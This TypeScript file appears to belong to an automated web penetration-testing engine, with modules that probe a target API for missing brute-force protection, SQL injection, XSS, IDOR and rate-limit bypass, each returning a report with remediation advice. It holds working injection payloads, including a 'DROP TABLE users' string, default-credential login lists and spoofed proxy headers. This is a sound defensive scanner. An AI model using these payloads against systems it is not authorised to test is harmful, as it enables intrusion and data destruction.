import { PenTestResult, PenTestConfiguration } from './PenetrationTestingEngine';

export class AttackModules {
  
  /**
   * Test for brute force protection on authentication endpoints
   */
  static async testBruteForceProtection(config: PenTestConfiguration): Promise<PenTestResult | null> {
    const testId = `bruteforce_${Date.now()}`;
    const startTime = Date.now();
    
    try {
      // Test login endpoint with multiple failed attempts
      const loginUrl = `${config.target_base_url}/api/v1/auth/login`;
      const testCredentials = [
        { username: 'admin', password: 'password' },
        { username: 'admin', password: '123456' },
        { username: 'admin', password: 'admin' },
        { username: 'test', password: 'test' },
        { username: 'user', password: 'password123' }
      ];

      let successfulAttempts = 0;
      let blockedAttempts = 0;
      const evidence: string[] = [];

      for (let i = 0; i < testCredentials.length; i++) {
        try {
          const response = await fetch(loginUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'penetration-testing-engine/1.0.0'
            },
            body: JSON.stringify(testCredentials[i])
          });

          evidence.push(`Attempt ${i + 1}: ${response.status} - ${response.statusText}`);

          if (response.status === 429) {
            blockedAttempts++;
          } else if (response.status === 200) {
            successfulAttempts++;
          }

          // Check rate limiting headers
          const rateLimitRemaining = response.headers.get('x-ratelimit-remaining');
          const rateLimitReset = response.headers.get('x-ratelimit-reset');
          if (rateLimitRemaining || rateLimitReset) {
            evidence.push(`Rate limit headers: remaining=${rateLimitRemaining}, reset=${rateLimitReset}`);
          }

        } catch (error) {
          evidence.push(`Attempt ${i + 1}: Network error - ${error}`);
        }

        // Small delay between attempts
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      const endTime = Date.now();

      // Analyze results
      if (blockedAttempts === 0 && successfulAttempts === 0) {
        // No rate limiting detected
        return {
          test_id: testId,
          test_type: 'authentication',
          severity: 'high',
          title: 'Missing Brute Force Protection',
          description: 'No rate limiting or brute force protection detected on login endpoint',
          attack_vector: 'Multiple login attempts without throttling',
          evidence,
          exploitation_difficulty: 'easy',
          business_impact: 'high',
          remediation: {
            immediate_actions: [
              'Implement rate limiting on authentication endpoints',
              'Add account lockout after failed attempts',
              'Implement CAPTCHA after multiple failures'
            ],
            long_term_fixes: [
              'Set up monitoring for brute force attacks',
              'Implement progressive delays for failed attempts',
              'Add IP-based blocking for repeated failures'
            ],
            code_changes: [
              'Add rate limiting middleware to auth routes',
              'Implement account lockout logic',
              'Add security event logging'
            ],
            configuration_changes: [
              'Configure rate limiting rules',
              'Set appropriate timeout values',
              'Enable security headers'
            ]
          },
          cwe_id: 'CWE-307',
          owasp_category: 'A07:2021 – Identification and Authentication Failures',
          cvss_score: 7.5,
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['Authentication endpoint exposure', 'No rate limiting']
        };
      } else if (blockedAttempts > 0) {
        // Rate limiting detected but test if it's sufficient
        return {
          test_id: testId,
          test_type: 'authentication',
          severity: 'info',
          title: 'Brute Force Protection Present',
          description: 'Rate limiting detected on authentication endpoint',
          attack_vector: 'Multiple login attempts with throttling',
          evidence,
          exploitation_difficulty: 'hard',
          business_impact: 'low',
          remediation: {
            immediate_actions: ['Review rate limiting thresholds'],
            long_term_fixes: ['Monitor for rate limiting bypass attempts'],
            code_changes: [],
            configuration_changes: ['Fine-tune rate limiting parameters']
          },
          cwe_id: 'CWE-307',
          owasp_category: 'A07:2021 – Identification and Authentication Failures',
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['Rate limiting implemented']
        };
      }

    } catch (error) {
      // Test failed, return null
    }

    return null;
  }

  /**
   * Test for SQL injection vulnerabilities
   */
  static async testSqlInjection(config: PenTestConfiguration): Promise<PenTestResult | null> {
    const testId = `sql_injection_${Date.now()}`;
    const startTime = Date.now();
    
    try {
      const sqlPayloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "' UNION SELECT 1,2,3 --",
        "1' OR 1=1 --",
        "admin'--",
        "admin' OR 1=1#"
      ];

      // Test endpoints that might be vulnerable
      const testEndpoints = [
        '/api/v1/users',
        '/api/v1/auth/login',
        '/api/v1/files'
      ];

      const evidence: string[] = [];
      let vulnerabilityFound = false;

      for (const endpoint of testEndpoints) {
        for (const payload of sqlPayloads) {
          try {
            // Test GET parameters
            const getResponse = await fetch(`${config.target_base_url}${endpoint}?id=${encodeURIComponent(payload)}`, {
              method: 'GET',
              headers: {
                'User-Agent': 'penetration-testing-engine/1.0.0',
                ...(config.authentication_credentials?.jwt_token && {
                  'Authorization': `Bearer ${config.authentication_credentials.jwt_token}`
                }),
                ...(config.authentication_credentials?.api_key && {
                  'X-API-Key': config.authentication_credentials.api_key
                })
              }
            });

            // Look for SQL error messages or unusual responses
            const responseText = await getResponse.text();
            if (this.detectSqlInjectionResponse(responseText, getResponse.status)) {
              vulnerabilityFound = true;
              evidence.push(`SQL injection detected in GET ${endpoint} with payload: ${payload}`);
              evidence.push(`Response status: ${getResponse.status}`);
              evidence.push(`Response contains SQL error indicators`);
            }

            // Test POST body (if safe mode is disabled)
            if (!config.safe_mode) {
              const postResponse = await fetch(`${config.target_base_url}${endpoint}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'User-Agent': 'penetration-testing-engine/1.0.0',
                  ...(config.authentication_credentials?.jwt_token && {
                    'Authorization': `Bearer ${config.authentication_credentials.jwt_token}`
                  }),
                  ...(config.authentication_credentials?.api_key && {
                    'X-API-Key': config.authentication_credentials.api_key
                  })
                },
                body: JSON.stringify({ query: payload, search: payload })
              });

              const postResponseText = await postResponse.text();
              if (this.detectSqlInjectionResponse(postResponseText, postResponse.status)) {
                vulnerabilityFound = true;
                evidence.push(`SQL injection detected in POST ${endpoint} with payload: ${payload}`);
                evidence.push(`Response status: ${postResponse.status}`);
              }
            }

          } catch (error) {
            // Network error, continue with next payload
          }

          // Small delay between requests
          await new Promise(resolve => setTimeout(resolve, 50));
        }
      }

      const endTime = Date.now();

      if (vulnerabilityFound) {
        return {
          test_id: testId,
          test_type: 'injection',
          severity: 'critical',
          title: 'SQL Injection Vulnerability',
          description: 'Application is vulnerable to SQL injection attacks',
          attack_vector: 'Malicious SQL payloads in user input',
          payload_used: sqlPayloads.join(', '),
          evidence,
          exploitation_difficulty: 'easy',
          business_impact: 'high',
          remediation: {
            immediate_actions: [
              'Implement parameterized queries',
              'Validate and sanitize all user input',
              'Use ORM with built-in SQL injection protection',
              'Disable detailed error messages in production'
            ],
            long_term_fixes: [
              'Implement Web Application Firewall (WAF)',
              'Regular security code reviews',
              'Automated SQL injection testing in CI/CD',
              'Database security hardening'
            ],
            code_changes: [
              'Replace string concatenation with parameterized queries',
              'Add input validation middleware',
              'Implement proper error handling',
              'Use prepared statements'
            ],
            configuration_changes: [
              'Enable database query logging',
              'Restrict database user permissions',
              'Configure database connection security',
              'Set up database monitoring'
            ]
          },
          cwe_id: 'CWE-89',
          owasp_category: 'A03:2021 – Injection',
          cvss_score: 9.8,
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['Direct database access', 'Insufficient input validation']
        };
      }

    } catch (error) {
      // Test failed
    }

    return null;
  }

  /**
   * Test for Cross-Site Scripting (XSS) vulnerabilities
   */
  static async testCrossSiteScripting(config: PenTestConfiguration): Promise<PenTestResult | null> {
    const testId = `xss_${Date.now()}`;
    const startTime = Date.now();
    
    try {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<script>console.log("XSS_TEST_MARKER")</script>'
      ];

      const testEndpoints = [
        '/api/v1/users',
        '/api/v1/files'
      ];

      const evidence: string[] = [];
      let vulnerabilityFound = false;

      for (const endpoint of testEndpoints) {
        for (const payload of xssPayloads) {
          try {
            // Test GET parameters
            const getResponse = await fetch(`${config.target_base_url}${endpoint}?name=${encodeURIComponent(payload)}`, {
              method: 'GET',
              headers: {
                'User-Agent': 'penetration-testing-engine/1.0.0',
                ...(config.authentication_credentials?.jwt_token && {
                  'Authorization': `Bearer ${config.authentication_credentials.jwt_token}`
                }),
                ...(config.authentication_credentials?.api_key && {
                  'X-API-Key': config.authentication_credentials.api_key
                })
              }
            });

            const responseText = await getResponse.text();
            if (this.detectXssResponse(responseText, payload)) {
              vulnerabilityFound = true;
              evidence.push(`XSS vulnerability detected in GET ${endpoint} with payload: ${payload}`);
              evidence.push(`Payload reflected in response without encoding`);
            }

            // Test POST body (if safe mode is disabled)
            if (!config.safe_mode) {
              const postResponse = await fetch(`${config.target_base_url}${endpoint}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                  'User-Agent': 'penetration-testing-engine/1.0.0',
                  ...(config.authentication_credentials?.jwt_token && {
                    'Authorization': `Bearer ${config.authentication_credentials.jwt_token}`
                  }),
                  ...(config.authentication_credentials?.api_key && {
                    'X-API-Key': config.authentication_credentials.api_key
                  })
                },
                body: JSON.stringify({ name: payload, description: payload })
              });

              const postResponseText = await postResponse.text();
              if (this.detectXssResponse(postResponseText, payload)) {
                vulnerabilityFound = true;
                evidence.push(`XSS vulnerability detected in POST ${endpoint} with payload: ${payload}`);
              }
            }

          } catch (error) {
            // Network error, continue
          }

          await new Promise(resolve => setTimeout(resolve, 50));
        }
      }

      const endTime = Date.now();

      if (vulnerabilityFound) {
        return {
          test_id: testId,
          test_type: 'injection',
          severity: 'high',
          title: 'Cross-Site Scripting (XSS) Vulnerability',
          description: 'Application is vulnerable to XSS attacks',
          attack_vector: 'Malicious scripts in user input',
          payload_used: xssPayloads.join(', '),
          evidence,
          exploitation_difficulty: 'easy',
          business_impact: 'medium',
          remediation: {
            immediate_actions: [
              'Implement output encoding/escaping',
              'Use Content Security Policy (CSP)',
              'Validate and sanitize user input',
              'Use secure templating engines'
            ],
            long_term_fixes: [
              'Implement XSS protection headers',
              'Regular security testing',
              'Security awareness training',
              'Use framework-level XSS protection'
            ],
            code_changes: [
              'Add HTML encoding to user output',
              'Implement input validation',
              'Use parameterized templates',
              'Add CSP headers'
            ],
            configuration_changes: [
              'Configure CSP policies',
              'Enable XSS protection headers',
              'Set up security monitoring',
              'Configure WAF rules'
            ]
          },
          cwe_id: 'CWE-79',
          owasp_category: 'A03:2021 – Injection',
          cvss_score: 7.2,
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['User input reflection', 'Insufficient output encoding']
        };
      }

    } catch (error) {
      // Test failed
    }

    return null;
  }

  /**
   * Test for Insecure Direct Object References (IDOR)
   */
  static async testInsecureDirectObjectReferences(config: PenTestConfiguration): Promise<PenTestResult | null> {
    const testId = `idor_${Date.now()}`;
    const startTime = Date.now();
    
    try {
      const testIds = ['1', '2', '3', '999', '1000', 'admin', 'test'];
      const testEndpoints = [
        '/api/v1/users',
        '/api/v1/files'
      ];

      const evidence: string[] = [];
      let vulnerabilityFound = false;

      for (const endpoint of testEndpoints) {
        for (const id of testIds) {
          try {
            const response = await fetch(`${config.target_base_url}${endpoint}/${id}`, {
              method: 'GET',
              headers: {
                'User-Agent': 'penetration-testing-engine/1.0.0',
                ...(config.authentication_credentials?.jwt_token && {
                  'Authorization': `Bearer ${config.authentication_credentials.jwt_token}`
                }),
                ...(config.authentication_credentials?.api_key && {
                  'X-API-Key': config.authentication_credentials.api_key
                })
              }
            });

            if (response.status === 200) {
              const responseText = await response.text();
              if (this.detectSensitiveDataExposure(responseText)) {
                vulnerabilityFound = true;
                evidence.push(`IDOR vulnerability: Accessed ${endpoint}/${id} - Status: ${response.status}`);
                evidence.push(`Response contains sensitive data for unauthorized resource`);
              }
            }

          } catch (error) {
            // Network error, continue
          }

          await new Promise(resolve => setTimeout(resolve, 50));
        }
      }

      const endTime = Date.now();

      if (vulnerabilityFound) {
        return {
          test_id: testId,
          test_type: 'authorization',
          severity: 'high',
          title: 'Insecure Direct Object References (IDOR)',
          description: 'Application allows unauthorized access to resources through direct object references',
          attack_vector: 'Direct manipulation of resource identifiers',
          evidence,
          exploitation_difficulty: 'easy',
          business_impact: 'high',
          remediation: {
            immediate_actions: [
              'Implement authorization checks for all resource access',
              'Use indirect object references or UUIDs',
              'Validate user permissions before data access',
              'Implement access control lists (ACLs)'
            ],
            long_term_fixes: [
              'Design secure authorization architecture',
              'Regular authorization testing',
              'Implement role-based access control (RBAC)',
              'Security code reviews for authorization logic'
            ],
            code_changes: [
              'Add authorization middleware to API routes',
              'Implement resource ownership validation',
              'Use secure object reference mapping',
              'Add logging for unauthorized access attempts'
            ],
            configuration_changes: [
              'Configure access control policies',
              'Set up authorization monitoring',
              'Enable access logging',
              'Configure user permission matrices'
            ]
          },
          cwe_id: 'CWE-639',
          owasp_category: 'A01:2021 – Broken Access Control',
          cvss_score: 8.1,
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['Predictable resource identifiers', 'Insufficient authorization checks']
        };
      }

    } catch (error) {
      // Test failed
    }

    return null;
  }

  /**
   * Test rate limiting effectiveness
   */
  static async testRateLimitBypass(config: PenTestConfiguration): Promise<PenTestResult | null> {
    const testId = `rate_limit_bypass_${Date.now()}`;
    const startTime = Date.now();
    
    try {
      const testEndpoint = `${config.target_base_url}/api/v1/auth/login`;
      const evidence: string[] = [];
      let bypassFound = false;

      // Test 1: X-Forwarded-For header manipulation
      const bypassTechniques = [
        { name: 'X-Forwarded-For manipulation', headers: { 'X-Forwarded-For': '192.168.1.100' } },
        { name: 'X-Real-IP manipulation', headers: { 'X-Real-IP': '10.0.0.100' } },
        { name: 'X-Client-IP manipulation', headers: { 'X-Client-IP': '172.16.0.100' } },
        { name: 'Different User-Agent', headers: { 'User-Agent': 'Mozilla/5.0 (Different Browser)' } }
      ];

      for (const technique of bypassTechniques) {
        let requestCount = 0;
        let rateLimitHit = false;

        // Send multiple requests quickly
        for (let i = 0; i < 20; i++) {
          try {
            const response = await fetch(testEndpoint, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'penetration-testing-engine/1.0.0',
                ...technique.headers
              },
              body: JSON.stringify({ username: 'test', password: 'test' })
            });

            requestCount++;
            
            if (response.status === 429) {
              rateLimitHit = true;
              break;
            }

          } catch (error) {
            // Network error
          }

          await new Promise(resolve => setTimeout(resolve, 10)); // Very short delay
        }

        if (requestCount >= 15 && !rateLimitHit) {
          bypassFound = true;
          evidence.push(`Rate limit bypass possible using ${technique.name}`);
          evidence.push(`Successfully sent ${requestCount} requests without rate limiting`);
        }
      }

      const endTime = Date.now();

      if (bypassFound) {
        return {
          test_id: testId,
          test_type: 'rate_limiting',
          severity: 'medium',
          title: 'Rate Limiting Bypass',
          description: 'Rate limiting can be bypassed using header manipulation techniques',
          attack_vector: 'Header manipulation to bypass IP-based rate limiting',
          evidence,
          exploitation_difficulty: 'medium',
          business_impact: 'medium',
          remediation: {
            immediate_actions: [
              'Implement rate limiting based on authenticated user',
              'Validate and sanitize proxy headers',
              'Use multiple rate limiting strategies',
              'Implement distributed rate limiting'
            ],
            long_term_fixes: [
              'Deploy rate limiting at multiple layers',
              'Implement behavior-based rate limiting',
              'Use CAPTCHA for suspicious traffic',
              'Set up advanced threat detection'
            ],
            code_changes: [
              'Modify rate limiting logic to use authenticated user ID',
              'Add header validation',
              'Implement composite rate limiting keys',
              'Add rate limiting bypass detection'
            ],
            configuration_changes: [
              'Configure proxy header validation',
              'Set up distributed rate limiting store',
              'Enable rate limiting monitoring',
              'Configure WAF rate limiting rules'
            ]
          },
          cwe_id: 'CWE-770',
          owasp_category: 'A04:2021 – Insecure Design',
          cvss_score: 5.3,
          detected_at: new Date(),
          test_duration_ms: endTime - startTime,
          complexity_factors: ['IP-based rate limiting only', 'Proxy header trust']
        };
      }

    } catch (error) {
      // Test failed
    }

    return null;
  }

  // Helper methods for vulnerability detection

  private static detectSqlInjectionResponse(responseText: string, statusCode: number): boolean {
    const sqlErrorPatterns = [
      /sql syntax error/i,
      /mysql error/i,
      /postgresql error/i,
      /oracle error/i,
      /sqlite error/i,
      /syntax error near/i,
      /invalid query/i,
      /database error/i,
      /you have an error in your sql syntax/i,
      /quoted string not properly terminated/i
    ];

    // Check for SQL error patterns in response
    for (const pattern of sqlErrorPatterns) {
      if (pattern.test(responseText)) {
        return true;
      }
    }

    // Check for unusual status codes that might indicate SQL errors
    if (statusCode === 500 && responseText.toLowerCase().includes('error')) {
      return true;
    }

    return false;
  }

  private static detectXssResponse(responseText: string, payload: string): boolean {
    // Check if the payload is reflected without proper encoding
    const unencoded = responseText.includes(payload);
    const hasScriptTag = /<script[^>]*>/.test(responseText) && responseText.includes(payload);
    const hasEventHandler = /on\w+\s*=/.test(responseText) && responseText.includes(payload);
    
    return unencoded && (hasScriptTag || hasEventHandler);
  }

  private static detectSensitiveDataExposure(responseText: string): boolean {
    const sensitivePatterns = [
      /email.*@.*\./i,
      /password/i,
      /ssn.*\d{3}-?\d{2}-?\d{4}/i,
      /credit.*card/i,
      /api.*key/i,
      /token/i,
      /secret/i,
      /private/i
    ];

    for (const pattern of sensitivePatterns) {
      if (pattern.test(responseText)) {
        return true;
      }
    }

    return false;
  }
} 